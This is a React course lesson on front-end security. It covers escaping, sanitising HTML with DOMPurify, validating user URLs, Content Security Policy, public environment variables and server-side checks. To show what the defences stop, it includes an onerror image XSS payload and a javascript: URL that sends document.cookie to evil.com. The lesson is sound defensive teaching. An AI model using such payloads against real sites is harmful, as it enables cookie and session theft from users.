---
publishDate: 2026-05-29T10:23
title: 'Security: XSS, CSP and Safe Rendering'
slug: security-best-practices
metadescription: Understand what React protects you from, the escape hatches that undo it, and the headers that catch what slips through.
updateDate: 2026-09-05T10:23
author: ['bishal-biswas']
level: 4
tags: ['security', 'xss', 'csp']
course: react
---

## What React gives you

React escapes everything it renders.

```javascript
function Comment({ text }) {
  return <p>{text}</p>;
}
<Comment text="<img src=x onerror='steal()'>" />
```

That displays as literal text. React escapes the value before it reaches the DOM, so injected markup never becomes markup.

This single behaviour prevents the overwhelming majority of XSS in React applications, and it is why React apps are generally safer than hand written DOM code.

Now the ways you can undo it.

## `dangerouslySetInnerHTML`

The name is a warning, and it should be treated as one.

```javascript
<div dangerouslySetInnerHTML={{ __html: userComment }} />
```

Whatever is in that string becomes real HTML. An `onerror` attribute runs. A `<script>` tag inserted this way does not execute, which lulls people into thinking it is safe. Event handler attributes absolutely do.

If you must render user HTML, sanitise it:

```javascript
import DOMPurify from 'dompurify';
function Article({ html }) {
  const clean = useMemo(
    () => DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['p', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'h2', 'h3'],
      ALLOWED_ATTR: ['href', 'title']
    }),
    [html]
  );
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

An explicit allow list is much safer than a deny list, because you cannot enumerate every dangerous thing.

Better still, do not accept HTML. Accept Markdown and render it yourself, so the set of possible output is one you control.

**Never write your own sanitiser.** People have been finding holes in hand written ones for twenty years.

## URLs from users

The one people forget.

```javascript
<a href={user.website}>Visit</a>
```

```javascript
user.website = 'javascript:fetch("https://evil.com?c="+document.cookie)';
```

React does not validate URLs. Check the protocol:

```javascript
function safeUrl(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol)
      ? parsed.href
      : '#';
  } catch {
    return '#';
  }
}
<a href={safeUrl(user.website)} rel="noopener noreferrer" target="_blank">
  Visit
</a>
```

`rel="noopener"` stops the linked page reaching back through `window.opener`. Modern browsers do this by default for `target="_blank"`, but being explicit costs nothing.

The same applies to `src` on images, iframes and scripts.

## Spreading unknown props

```javascript
function Widget({ config }) {
  return <div {...config} />;
}
```

If `config` comes from an API, it could contain `dangerouslySetInnerHTML`. Pick the props you want rather than spreading whatever arrives.

## Content Security Policy

Your safety net for when something slips through.

```javascript
// Content-Security-Policy:
//   default-src 'self';
//   script-src 'self' 'nonce-{RANDOM}';
//   style-src 'self' 'unsafe-inline';
//   img-src 'self' data: https:;
//   connect-src 'self' https://api.example.com;
//   frame-ancestors 'none';
//   base-uri 'self';
//   form-action 'self'
```

The important effect is that inline scripts stop running, which is precisely how injected code executes.

- **`frame-ancestors 'none'`** prevents clickjacking.
- **`base-uri 'self'`** stops an injected `<base>` tag redirecting every relative URL.
- **`form-action 'self'`** stops a form posting your data elsewhere.

The nonce must be freshly random per response. A fixed one is worthless.

Start in report only mode:

```javascript
// Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

You will find things you did not know were loading.

Note that `'unsafe-inline'` for styles is often unavoidable with React inline styles and CSS-in-JS. Inline **scripts** are the ones that matter.

## Environment variables are public

```javascript
const apiKey = import.meta.env.VITE_STRIPE_SECRET_KEY;
```

Everything with the `VITE_` prefix is compiled into your bundle. Anyone can read it in DevTools. The same applies to `NEXT_PUBLIC_` in Next.js.

Publishable keys are fine. Secret keys, database URLs and private API keys must stay on a server.

If you have already shipped a secret this way, **rotate it**. It is in every user's browser cache and quite possibly in your git history.

## Client checks are not security

```javascript
{user.isAdmin && <DeleteAllButton />}
if (!user.canEdit) return <p>Not allowed</p>;
```

Both are user experience. Anyone can edit the state in DevTools, or call the endpoint directly with `curl`. The server must check.

The same for validation. Check on the client so users get fast feedback, and check on the server because that is the check that counts.

## Dependencies

Most of the code you ship, you did not write.

```bash
npm audit
npm audit fix
npm ls --depth=0
```

Judge advisories in context. A vulnerability in a build tool that never sees user input is not the same as one in your server framework.

Beyond auditing: prefer fewer dependencies, pin with a lockfile, and be suspicious of packages with very few downloads or names one character away from a popular one.

## Other headers

```javascript
// Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
// X-Content-Type-Options: nosniff
// Referrer-Policy: strict-origin-when-cross-origin
// Permissions-Policy: camera=(), microphone=(), geolocation=()
```

Cheap to add, and each closes a real category of problem.

## A checklist

- Use `{value}`, and treat `dangerouslySetInnerHTML` as a last resort.
- Sanitise with DOMPurify and an allow list if you must render HTML.
- Validate URL protocols before `href` or `src`.
- Never spread unknown props onto an element.
- Send a CSP and avoid inline scripts.
- Keep secrets out of `VITE_` and `NEXT_PUBLIC_` variables.
- Enforce every permission on the server.
- Audit dependencies and keep them few.
- Serve everything over HTTPS with security headers.

## Quick recap

- React escapes rendered values, which prevents most XSS.
- `dangerouslySetInnerHTML` disables that, so sanitise with an allow list.
- User supplied URLs need protocol validation.
- CSP is the safety net, and blocking inline scripts is the point.
- Any client visible environment variable is public.
- Client side permission checks are user experience only.
- Audit dependencies, and judge advisories in context.

<code id="code-content" class="language-javascript">
import { useMemo } from 'react';
import DOMPurify from 'dompurify';
// SAFE BY DEFAULT: React escapes this, so injected markup stays text
function Comment({ text }) {
  return &lt;p&gt;{text}&lt;/p&gt;;       // "&lt;img src=x onerror=...&gt;" shows literally
}
// THE ESCAPE HATCH. If you must render HTML, sanitise with an ALLOW
// list, because you cannot enumerate every dangerous thing.
// A &lt;script&gt; tag inserted this way does not run, which lulls people
// into thinking it is safe. Event handler attributes absolutely do run.
function Article({ html }) {
  const clean = useMemo(
    () =&gt;
      DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['p', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'h2'],
        ALLOWED_ATTR: ['href', 'title']
      }),
    [html]
  );
  return &lt;div dangerouslySetInnerHTML={{ __html: clean }} /&gt;;
}
// NEVER write your own sanitiser. Better still, accept Markdown rather
// than HTML, so the possible output is a set you control.
// URLS FROM USERS: React does NOT validate these. A javascript: URL in
// an href runs when clicked.
function safeUrl(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol)
      ? parsed.href
      : '#';
  } catch {
    return '#';
  }
}
function ProfileLink({ user }) {
  return (
    &lt;a href={safeUrl(user.website)} target="_blank" rel="noopener noreferrer"&gt;
      {user.name}
    &lt;/a&gt;
  );
}
// NEVER spread unknown props. If config came from an API it could
// contain dangerouslySetInnerHTML.
function Widget({ config }) {
  return &lt;div className={config.className} id={config.id} /&gt;;   // pick them
}
// ENVIRONMENT VARIABLES ARE PUBLIC. Everything with VITE_ or
// NEXT_PUBLIC_ is compiled into the bundle and readable in DevTools.
// If you have shipped a secret this way, ROTATE IT.
const publishableKey = import.meta.env.VITE_STRIPE_PUBLISHABLE_KEY;  // fine
// const secret = import.meta.env.VITE_STRIPE_SECRET_KEY;            never
// CLIENT CHECKS ARE USER EXPERIENCE, NOT SECURITY. Anyone can edit
// state in DevTools or call the endpoint with curl.
function AdminPanel({ user }) {
  if (!user.isAdmin) return &lt;p&gt;Not allowed&lt;/p&gt;;   // cosmetic only
  return &lt;DeleteAllButton /&gt;;                     // the SERVER must check
}
// HEADERS, all cheap and each closing a real category of problem:
//   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-X';
//     frame-ancestors 'none'; base-uri 'self'; form-action 'self'
//   Strict-Transport-Security: max-age=63072000; includeSubDomains
//   X-Content-Type-Options: nosniff
//   Referrer-Policy: strict-origin-when-cross-origin
// Start with Content-Security-Policy-Report-Only. You will find things
// you did not know were loading.
</code></pre>
